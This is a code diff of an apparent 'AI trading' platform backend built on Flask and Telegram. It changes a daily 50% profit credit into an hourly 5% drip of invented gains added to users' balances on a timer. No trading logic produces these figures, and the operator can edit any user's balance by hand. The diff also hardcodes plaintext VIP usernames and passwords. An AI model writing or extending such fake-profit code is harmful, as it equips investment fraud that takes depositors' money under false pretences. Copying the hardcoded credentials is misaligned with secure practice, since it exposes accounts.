@@ -20,7 +20,7 @@ VIP_USERS = {
     "bear_hunter": "hunter2026", "smart_money": "smc2026", "profit_maker": "profit#100",
     "signal_boss": "boss@2026", "alpha_trader": "alpha!fx", "pip_catcher": "catch100",
     "whale_alert": "whale999", "crypto_fx": "fx@crypto", "scalper_pro": "scalp50",
-    "r": "t"
+    "vi": "tr"
 }
 
 tv = TvDatafeed()
@@ -60,31 +60,54 @@ def send_telegram_alert(msg):
             urllib.request.urlopen(req)
         except Exception as e: print("Telegram Alert Error:", e)
 
-def daily_profit_updater():
+# 🚀 NEW: HOURLY PROFIT DRIP SYSTEM (5% per hour for 10 hours)
+def hourly_profit_updater():
     while True:
-        now = get_bd_time()
-        if now.hour == 0 and now.minute == 1:
+        try:
+            now = get_bd_time()
+            current_date = now.strftime("%Y-%m-%d")
+            current_hour_str = now.strftime("%Y-%m-%d %H") # Example: '2026-11-17 14'
+            
             users = load_users_data()
             updated = False
+            
             for username, data in users.items():
                 deposit = float(data.get('deposit', 0.0))
                 if deposit > 0:
-                    daily_profit = deposit * 0.50 
-                    current_balance = float(data.get('balance', 0.0))
-                    current_total_profit = float(data.get('total_profit', 0.0))
+                    last_date = data.get('last_profit_date', '')
                     
-                    data['profit'] = f"{daily_profit:.2f}"
-                    data['balance'] = f"{(current_balance + daily_profit):.2f}"
-                    data['total_profit'] = f"{(current_total_profit + daily_profit):.2f}"
-                    data['last_profit_update'] = now.strftime("%Y-%m-%d")
-                    updated = True
+                    # নতুন দিন শুরু হলে Daily Profit জিরো হবে এবং 10 ঘণ্টার কাউন্ট ডাউন রিস্টার্ট হবে
+                    if last_date != current_date:
+                        data['last_profit_date'] = current_date
+                        data['today_ticks'] = 0
+                        data['profit'] = "0.00"
+                        updated = True
+                        
+                    today_ticks = data.get('today_ticks', 0)
+                    last_tick_hour = data.get('last_tick_hour', '')
+                    
+                    # প্রতি ঘণ্টায় একবার ৫% প্রফিট ঢুকবে (সর্বোচ্চ ১০ বার = ৫০%)
+                    if today_ticks < 10 and last_tick_hour != current_hour_str:
+                        hourly_profit = deposit * 0.05
+                        current_balance = float(data.get('balance', 0.0))
+                        current_total_profit = float(data.get('total_profit', 0.0))
+                        current_daily_profit = float(data.get('profit', 0.0))
+                        
+                        data['profit'] = f"{(current_daily_profit + hourly_profit):.2f}"
+                        data['balance'] = f"{(current_balance + hourly_profit):.2f}"
+                        data['total_profit'] = f"{(current_total_profit + hourly_profit):.2f}"
+                        
+                        data['today_ticks'] = today_ticks + 1
+                        data['last_tick_hour'] = current_hour_str
+                        updated = True
+                        
             if updated:
                 save_users_data(users)
-                send_telegram_alert("🤖 *AI SYSTEM ALERT*\n\n✅ Daily 50% profit has been automatically distributed to all active accounts!")
-            time.sleep(60) 
-        time.sleep(30)
+        except Exception as e:
+            pass
+        time.sleep(60) # প্রতি ১ মিনিট পর পর চেক করবে ঘণ্টা বদলালো কিনা
 
-threading.Thread(target=daily_profit_updater, daemon=True).start()
+threading.Thread(target=hourly_profit_updater, daemon=True).start()
 
 last_update_id = 0
 def telegram_polling():
@@ -112,18 +135,19 @@ def telegram_polling():
                             if field in valid_fields:
                                 users = load_users_data()
                                 if username not in users: users[username] = {"balance": "0.00", "deposit": "0.00", "profit": "0.00", "total_profit": "0.00", "withdraw": "0.00"}
+                                
                                 if field == 'deposit':
                                     try:
                                         dep_amount = float(value)
-                                        daily_profit = dep_amount * 0.50
-                                        new_balance = dep_amount + daily_profit
+                                        # ডিপোজিট সেট করার সাথে সাথে ব্যালেন্স সেট হবে এবং হাওয়ারলি প্রফিটের জন্য সিস্টেম রেডি হবে
                                         users[username]['deposit'] = f"{dep_amount:.2f}"
-                                        users[username]['profit'] = f"{daily_profit:.2f}"
-                                        users[username]['balance'] = f"{new_balance:.2f}"
-                                        current_total_profit = float(users[username].get('total_profit', "0.00"))
-                                        users[username]['total_profit'] = f"{current_total_profit + daily_profit:.2f}"
+                                        users[username]['balance'] = f"{dep_amount:.2f}"
+                                        users[username]['profit'] = "0.00"
+                                        users[username]['today_ticks'] = 0
+                                        users[username]['last_tick_hour'] = "" # এতে করে ১ মিনিটের মধ্যেই প্রথম ৫% ঢুকে যাবে
+                                        
                                         save_users_data(users)
-                                        send_telegram_alert(f"🤖 *AI Setup Done!*\n👤 *User:* `{username}`\n📥 *Deposit:* ${dep_amount:.2f}\n📈 *Daily Profit (50%):* ${daily_profit:.2f}\n💵 *New Balance:* ${new_balance:.2f}")
+                                        send_telegram_alert(f"🤖 *AI System Ready!*\n👤 *User:* `{username}`\n📥 *Deposit:* ${dep_amount:.2f}\n⏳ *Profit will drip automatically 5% per hour (up to 50% daily)!*")
                                     except ValueError: send_telegram_alert("❌ *Error:* Deposit amount must be a number!")
                                 else:
                                     users[username][field] = value
@@ -131,7 +155,6 @@ def telegram_polling():
                                     send_telegram_alert(f"✅ *Data Updated!*\n👤 *User:* `{username}`\n📝 *Field:* {field}\n💰 *New Value:* ${value}")
                             else: send_telegram_alert(f"❌ *Invalid Field!*\nUse: `balance`, `deposit`, `profit`, `total_profit`, `withdraw`")
                     
-                    # 🚀 নতুন: এক্টিভ ইউজার দেখার কমান্ড
                     elif text == '/users':
                         devices = load_devices()
                         active_users = set()
@@ -145,7 +168,6 @@ def telegram_polling():
                             send_telegram_alert(msg)
                         else: send_telegram_alert("🔴 *No active users found.*")
 
-                    # 🚀 নতুন: ইউজার কিক-আউট করার কমান্ড
                     elif text.startswith('/logout '):
                         parts = text.split()
                         if len(parts) >= 2:
@@ -206,7 +228,6 @@ def approve_device(device_id):
         return f"<div style='text-align: center; margin-top: 50px;'><h1 style='color: green;'>✅ Approved!</h1><h2>User: {devices[device_id]['username']}</h2></div>"
     return "<h1 style='color: red; text-align: center;'>❌ Invalid!</h1>"
 
-# 🚀 নতুন: Strict Session Auth Checker
 @app.route('/api/check_auth', methods=['POST'])
 def check_auth():
     username = request.get_json().get('username', '')
